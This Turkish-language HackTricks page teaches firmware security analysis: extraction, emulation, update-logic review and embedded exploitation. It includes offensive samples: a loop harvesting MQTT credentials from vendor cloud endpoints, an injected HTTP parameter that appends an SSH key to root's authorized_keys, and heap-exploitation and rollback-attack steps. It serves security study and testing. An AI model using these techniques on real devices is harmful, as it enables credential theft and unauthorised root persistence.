# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; bu sayede cihaz, açıldığı andan itibaren işletim sisteminin başlatılmasını sağlayan kritik talimatlara erişebilir. Firmware'i incelemek ve gerektiğinde değiştirmek, güvenlik açıklarını tespit etmede kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç aşağıdakilerle ilgili verilerin toplanmasını içerir:

- CPU mimarisi ve üzerinde çalıştığı işletim sistemi
- Bootloader özellikleri
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuata uygunluk sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları son derece değerlidir. Ayrıca mevcut open-source yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware'i Edinme**

Firmware edinme, her biri farklı bir karmaşıklık düzeyine sahip çeşitli yöntemlerle gerçekleştirilebilir:

- Kaynaktan (geliştiricilerden veya üreticilerden) **doğrudan edinme**
- Sağlanan talimatlarla **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- **Güncellemeleri**, man-in-the-middle teknikleriyle yakalama
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimi içindeki güncelleme isteklerini **sniffing** ile izleme
- **Hardcoded update endpoint**'lerini belirleme ve kullanma
- Bootloader veya ağ üzerinden **dump alma**
- Diğer tüm yöntemler başarısız olduğunda uygun donanım araçlarını kullanarak depolama yongasını **çıkarma ve okuma**

### Yalnızca UART logları: flash içindeki U-Boot env üzerinden root shell zorlama

UART RX yok sayılıyorsa (yalnızca loglar alınıyorsa), **U-Boot environment blob**'unu çevrimdışı **düzenleyerek** yine de bir init shell zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla (3.3V) SPI flash dump'ı alın:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env bölümünü bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve **U-Boot env CRC32** değerini blob için yeniden hesaplayın.
3. Yalnızca env bölümünü yeniden flash'layıp cihazı yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env bölümünün harici flash erişimi üzerinden yazılabildiği embedded cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza** göre, ona nasıl yaklaşmanız gerektiğini anlamak için firmware hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar vardır:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Bu araçlarla fazla bir şey bulamazsanız `binwalk -E <bin>` ile imajın **entropy** değerini kontrol edin; entropy düşükse şifrelenmiş olma ihtimali düşüktür. Entropy yüksekse şifrelenmiş olması (veya bir şekilde sıkıştırılmış olması) muhtemeldir.

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Alma

Önceki bölümde açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasörün içinde** çıkarır; bu klasör genellikle şu adlardan birine sahip olur: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, imza listesinde dosya sisteminin **magic byte** değerine sahip olmayabilir. Bu durumlarda binwalk'u kullanarak dosya sisteminin ofsetini bulun, sıkıştırılmış dosya sistemini binary'den **carve edin** ve aşağıdaki adımları kullanarak türüne göre dosya sistemini **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem'ini carve etmek için aşağıdaki **dd command** komutunu çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar bundan sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware'ı Analiz Etme

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için firmware'ı ayrıntılı olarak incelemek gerekir. Bu süreç, firmware image'ından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın ( `<bin>` olarak belirtilir) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar dosya türlerini belirlemeye, string'leri çıkarmaya, ikili verileri analiz etmeye ve partition ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün şifreleme durumunu değerlendirmek için **entropy**, `binwalk -E <bin>` kullanılarak kontrol edilir. Düşük entropy, şifreleme olmadığını düşündürürken yüksek entropy, olası şifreleme veya compression olduğunu gösterir.

**Embedded files** çıkarmak için **file-data-carving-recovery-tools** documentation ve dosya inceleme amacıyla **binvis.io** gibi tool ve resource'lar önerilir.

### Filesystem'ı Çıkarma

`binwalk -ev <bin>` kullanıldığında filesystem genellikle, filesystem type'ından sonra adlandırılan bir directory'ye (ör. squashfs, ubifs) çıkarılabilir. Ancak **binwalk**, magic bytes eksikliği nedeniyle filesystem type'ını tanıyamadığında manual extraction gerekir. Bu işlem, filesystem'ın offset'ini bulmak için `binwalk` kullanmayı ve ardından filesystem'ı carve out etmek için `dd` command'ını kullanmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Sonrasında, filesystem türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel şekilde çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Filesystem çıkarıldıktan sonra security flaw araması başlar. Güvenli olmayan network daemon'larına, hardcoded credential'lara, API endpoint'lerine, update server işlevlerine, derlenmemiş code'lara, startup script'lerine ve offline analysis için compiled binary'lere dikkat edilir.

**İncelenecek önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı credential'ları için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL certificate'ları ve key'leri
- Olası vulnerability'ler için configuration ve script file'ları
- Daha ileri analysis için embedded binary'ler
- Yaygın IoT device web server'ları ve binary'leri

Filesystem içindeki sensitive information ve vulnerability'leri ortaya çıkarmaya yardımcı olan çeşitli tool'lar vardır:

- Sensitive information araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binary'ler Üzerinde Security Check'leri

Filesystem içinde bulunan hem source code hem de compiled binary'ler vulnerability'ler açısından dikkatle incelenmelidir. Unix binary'leri için **checksec.sh** ve Windows binary'leri için **PESecurity** gibi tool'lar, exploit edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Derived URL token'ları üzerinden cloud config ve MQTT credential'larını elde etme

Birçok IoT hub, device başına configuration'ını aşağıdakine benzeyen bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında, `<token>` değerinin hardcoded bir secret kullanılarak device ID'den local olarak türetildiğini görebilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak gösterilir

Bu tasarım, bir deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak tanır; bu işlem çoğu zaman plaintext MQTT credential'larını ve topic prefix'lerini ortaya çıkarır.

Pratik workflow:

1) UART boot log'larından deviceId'yi çıkarın

- Bir 3.3V UART adapter'ını (TX/RX/GND) bağlayın ve log'ları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Bulut yapılandırma URL kalıbını ve broker adresini yazdıran satırları arayın; örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'dan STATIC_KEY ve token algoritmasını kurtarma

- Binary'leri Ghidra/radare2'ye yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT kimlik bilgilerini toplayın

- URL’yi oluşturun ve curl ile JSON’u çekin; sırları ayıklamak için jq ile ayrıştırın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Düz metin MQTT'yi ve zayıf topic ACL'lerini kötüye kullan (varsa)

- Ele geçirilen kimlik bilgilerini kullanarak bakım topic'lerine abone ol ve hassas olayları ara:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir cihaz kimliklerini numaralandırma (yetkili olarak, ölçekli)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarını sıralı bir sonek ile birleştirir.
- Aday kimlikler üzerinde yineleme yapabilir, token'lar türetebilir ve yapılandırmaları programatik olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Toplu enumeration gerçekleştirmeden önce her zaman açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden secret'ları elde etmek için emulation veya static analysis yöntemlerini tercih edin.


Firmware'ı emulation ile çalıştırma süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis** işlemine olanak tanır. Bu yaklaşım, donanım ya da architecture bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary'leri Raspberry Pi gibi matching architecture ve endianness özelliklerine sahip bir cihaza ya da önceden oluşturulmuş bir virtual machine'e aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emulation ile Çalıştırma

Tek programları incelemek için programın endianness ve CPU architecture özelliklerini belirlemek kritik öneme sahiptir.

#### MIPS Mimarisi Örneği

Bir MIPS architecture binary'sini emulation ile çalıştırmak için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için ise `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emulation amacıyla `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar, tam firmware emulation'ını kolaylaştırır, süreci otomatikleştirir ve dynamic analysis yapılmasına yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analiz için gerçek veya emulated bir device environment kullanılır. OS ve filesystem üzerinde shell access korunmalıdır. Emulation, hardware etkileşimlerini kusursuz şekilde taklit etmeyebilir; bu nedenle zaman zaman emulation'ın yeniden başlatılması gerekebilir. Analiz sırasında filesystem yeniden incelenmeli, açığa çıkarılmış webpage'ler ve network service'leri exploit edilmeli ve bootloader vulnerability'leri araştırılmalıdır. Olası backdoor vulnerability'lerini belirlemek için firmware integrity test'leri kritik öneme sahiptir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi araçları kullanarak bir process veya binary ile kendi operating environment'ında etkileşim kurmayı; breakpoint'ler ayarlamayı ve fuzzing ile diğer teknikler aracılığıyla vulnerability'leri belirlemeyi içerir.

Tam bir debugger bulunmayan embedded target'lar için, **statik olarak linklenmiş bir `gdbserver`'ı** device'a **kopyalayın** ve uzaktan attach olun:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larda RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. Yararlı bir workflow, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada **RF frame**
2. Radio MCU üzerindeki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki reversing hedefi oluşturur. Controller binary radio frame’lerini `Group,Command,arg1,arg2,...` gibi bir textual protocol’e dönüştürüyorsa şunları ortaya çıkarın:

- **message groups** ve dispatch tabloları
- Hangi mesajların **network** üzerinden, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator fields** (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’lara yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebildiği

Özellikle Zigbee için pairing trafiğini capture edin ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Böyleyse commissioning trafiğini sniff etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install codes bu exposure’ı azaltır; bu nedenle test edilen cihazın bunları gerçekten enforce edip etmediğini not edin.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL command’ları genellikle standardized cluster’lardan daha iyi bir hedeftir; çünkü daha az battle-tested validation içeren **custom parsing code** ve dahili **FSM**’lere ulaşırlar.<sup>[[8]](#references)</sup>

Pratik workflow:

- **vendor-only handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** tablolarını ortaya çıkarın.
- Otomatik olarak ilerleyen **transitional states** ile sonunda attacker-controlled state’i resetleyen veya free eden retry/error branch’lerini belirleyin.
- Buggy handler’ın her zaman erişilebilir olduğunu varsaymak yerine daemon’ı vulnerable state’e getirmek için hangi legitimate protocol exchange’lerin gerekli olduğunu doğrulayın.

Timing-sensitive protocol’ler için Python framework’ünden packet replay çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoints**, **attributes** ve commissioning timing’i açığa çıkarabilmek için vendor-grade stack kullanan gerçek donanım (örneğin bir **nRF52840**) üzerinde legitimate device’ı emulate etmektir.

### Fragmented-download bug class in embedded daemons

Embedded daemon’larda tekrarlanan bir firmware bug class, **fragmented blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`) `ctx->total_size` değerini saklar ve `malloc(total_size)` ile allocation yapar.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** alanları validate eder.
3. Copy işlemi, orijinal allocated size’a karşı kontrol yapılmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu durum attacker’ın şunları göndermesine olanak tanır:

- Küçük bir heap allocation zorlamak için **small** declared total size içeren ilk valid fragment.
- **Expected offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki fragment.
- Fresh check’leri karşılayan, fakat başlangıçta allocated buffer’ı yine de overflow eden forged packet-local size.

Vulnerable path commissioning logic’in arkasındaysa exploitation, malformed fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine sürmek için yeterli **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu genellikle “cleanup’ı beklemek” değil, protocol’ün kendi error handling’ini **force** etmektir:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine itmek için malformed follow-up fragment’ler gönderin.
- Retry threshold’u aşarak daemon’ın **context’i reset etmesini** ve corrupted buffer’ı free etmesini sağlayın.
- Process ilgisiz nedenlerle crash etmeden önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yaklaşım, embedded Linux’taki **musl/uClibc/dlmalloc-like** allocator’lara karşı özellikle kullanışlıdır; chunk metadata’yı corrupt etmek, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Stable bir pattern, gerçek bin pointer’larını hemen clobber edip process’i crash ettirmek yerine, allocator traversal’ı **overflowed buffer** içinde staged edilmiş **fake chunks**’lara yönlendirmek için bir **size field**’ı corrupt etmektir.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerabilities için bir PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve lower-level language’lerde programming yapılmasını gerektirir. Embedded system’lerde binary runtime protections nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonraki bir large allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle herhangi bir fake chunk check’lerden geçebilmelidir (makul size, `fd = 0` ve çevredeki chunk’ların “in use” olarak görülmesi).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR etkin, ancak ana binary **non-PIE** ise binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ı bir **function pointer table** üzerine yerleştirmek için zaten valid bir heap chunk header’a benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser-stopping NUL:** JSON parse edildiğinde payload içindeki bir `\x00`, parsing’i durdururken stack pivot/ROP chain için sondaki attacker-controlled byte’ların korunmasını sağlayabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağrılarını yapan bir ROP chain, executable shellcode’u bilinen bir mapping içine yerleştirip oraya jump edebilir.

## Firmware Analysis için Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating system’ler, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış environment’lar sağlar.

## Firmware’i analiz etmek için Prepared OS’ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) device’larının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak üzere tasarlanmış bir distro’dur. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir environment sağlayarak size büyük ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware image’ları için cryptographic signature checks uygulasa bile, **version rollback (downgrade) protection** sıklıkla atlanır. Boot- veya recovery-loader, embedded public key ile yalnızca signature’ı verify ediyor ancak flash edilen image’ın *version* değerini (veya monotonic counter’ını) karşılaştırmıyorsa attacker, **geçerli bir signature** taşımaya devam eden **daha eski ve vulnerable bir firmware’i** meşru şekilde yükleyebilir ve böylece patched vulnerabilities’leri yeniden kullanılabilir hâle getirebilir.<sup>[[4]](#references)</sup>

Tipik attack workflow:

1. **Eski signed image’ı edinin**
* Vendor’ın public download portal’ından, CDN’inden veya support site’ından alın.
* Companion mobile/desktop application’lardan extract edin (örneğin bir Android APK içinde `assets/firmware/` altında).
* VirusTotal, Internet archives, forumlar vb. third-party repository’lerden retrieve edin.
2. Image’ı exposed update channel üzerinden cihaza **upload edin veya serve edin**:
* Web UI, mobile-app API, USB, TFTP, MQTT vb.
* Birçok consumer IoT device, Base64-encoded firmware blob’larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini tetikleyen *unauthenticated* HTTP(S) endpoint’leri expose eder.
3. Downgrade işleminden sonra newer release’te patched edilmiş bir vulnerability’yi exploit edin (örneğin daha sonra eklenmiş bir command-injection filter).
4. Persistence elde edildikten sonra detection’dan kaçınmak için isteğe bağlı olarak latest image’ı yeniden flash edin veya updates’leri disable edin.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Savunmasız (downgrade edilmiş) firmware'de `md5` parametresi, herhangi bir sanitisation uygulanmadan doğrudan bir shell komutuna birleştirilir ve bu da keyfi komutların enjekte edilmesine olanak tanır (burada SSH key-based root access etkinleştirilir). Daha sonraki firmware sürümleri temel bir karakter filtresi ekledi, ancak downgrade korumasının bulunmaması düzeltmeyi etkisiz kılar.<sup>[[4]](#references)</sup>

### Mobile Apps'ten Firmware Çıkarma

Birçok vendor, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware image'larını companion mobile application'larının içine ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi path'lerde şifrelenmemiş olarak saklanır. `apktool`, `ghidra` ve hatta düz `unzip` gibi araçlar, fiziksel hardware'e dokunmadan imzalı image'ları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında yalnızca updater kapsamındaki anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** mekanizmasını uygular, ancak bunu yalnızca *updater* mantığı içinde kullanır (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapar ve partition table ya da slot metadata bilgisine güvenirse rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan bir değerle karşılaştırır ve daha eski signed image'ları reddeder.
- Bootloader bu ratchet değerini **parse etmez**; boot etmeden önce yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation ayrı olarak bir partition table'da veya per-slot generation counter ile saklanır ve doğrulanan exact firmware digest'e kriptografik olarak bağlanmaz.

Bu durum dual-slot sistemlerde bir **validate-one-image / boot-another-image** primitive oluşturur. Saldırgan, updater'ın güncel bir signed image kullanarak slot B'yi sonraki boot target olarak işaretlemesini sağlayabilir ve reboot öncesinde slot B'yi yeniden yazabilirse bootloader downgraded image'ı yine boot edebilir; çünkü bootloader yalnızca daha önce commit edilmiş slot metadata bilgisine güvenir.

Yaygın abuse pattern:

1. **Current signed** firmware'ı passive slot'a yükleyin ve layout'un bu slotu sonraki active slot olarak işaretlemesi için normal validation/switch rutinini çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase rutinine yeniden girin.
3. Updater'ın, az önce promote edilen **aynı physical slotu** silmesini sağlamak için stale boot-state veya stale slot-selection logic'i abuse edin.
4. Bu slota **daha eski ancak hâlâ signed** bir firmware yazın.
5. Ratchet'i enforce eden validation rutinini atlayın ve doğrudan reboot edin.
6. Bootloader promote edilmiş slotu seçer, yalnızca signature/integrity doğrulaması yapar ve eski image'ı boot eder.

A/B update implementasyonlarını reverse ederken aranacak noktalar:

- Başarılı bir switch sonrasında yenilenmeyen **boot-time flag** değerlerinden türetilen slot selection.
- **Current committed layout** yerine stale state'e göre bir slotu silen `prepare_passive_slot()` tarzı rutin.
- Yalnızca bir **generation counter** / active flag artıran ve doğrulanmış image hash'ini saklamayan `part_write_layout()` tarzı bir function.
- Userspace veya updater code içinde implement edilmiş, ancak ROM / bootloader / secure boot stages içinde bulunmayan ratchet kontrolleri.
- İçeriği silinip yeniden yazıldıktan sonra slotu bootable olarak işaretli bırakan erase veya recovery rutinleri.

### Update Logic'i Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication katmanı yeterince korunuyor mu (TLS + authentication)?
* Cihaz flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signatures ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrolü yapmak yerine updater ile **aynı ratchet'i enforce ediyor mu**?
* Slot activation metadata, **validated firmware digest/version** değerine bağlı mı, yoksa promotion sonrasında bir slot değiştirilebiliyor mu?
* Slot switch başarılı olduktan sonra cihaz reboot etmeye zorlanıyor mu, yoksa aynı session içinde sonraki update/erase rutinlerine hâlâ erişilebiliyor mu?
* Userland code ek sanity check'ler gerçekleştiriyor mu (ör. allowed partition map, model number)?
* *Partial* veya *backup* update flow'ları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attack'lerine karşı vulnerable'dır.

## Pratik yapmak için vulnerable firmware

Firmware'daki vulnerabilities keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki vulnerable firmware projelerini kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

